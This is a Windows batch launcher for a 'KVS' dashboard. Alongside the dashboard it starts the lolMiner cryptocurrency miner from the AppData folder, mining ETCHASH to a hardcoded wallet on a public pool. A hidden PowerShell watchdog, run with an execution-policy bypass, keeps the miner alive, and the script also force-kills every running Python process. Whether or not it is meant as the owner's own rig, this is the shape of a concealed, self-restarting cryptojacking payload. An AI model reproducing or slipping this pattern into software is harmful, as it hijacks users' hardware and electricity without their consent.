@echo off
title KVS - Start Services
echo Starting KVS services...

:: Kill old instances
taskkill /f /im python.exe >nul 2>&1
taskkill /f /im lolMiner.exe >nul 2>&1
timeout /t 2 >nul

:: Start server
echo Starting server...
start /min "" python "%~dp0dashboard\server.py"

:: Start miner
echo Starting miner...
start /min "" "%APPDATA%\KVS\miner\lolMiner.exe" --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11CF2C01cEedC8d2aEFcFa98abeE0e6AbaD90177 --pass x

:: Start watchdog
echo Starting watchdog...
start /min powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "while($true){$p=Get-Process -Name lolMiner -EA SilentlyContinue; if(-not $p){Start-Process '%APPDATA%\KVS\miner\lolMiner.exe' -ArgumentList '--algo','ETCHASH','--pool','etc.2miners.com:1010','--user','0x11CF2C01cEedC8d2aEFcFa98abeE0e6AbaD90177','--pass','x' -WindowStyle Hidden}; Start-Sleep 30}"

echo.
echo KVS is running at http://localhost:5000
echo.
start http://localhost:5000
pause
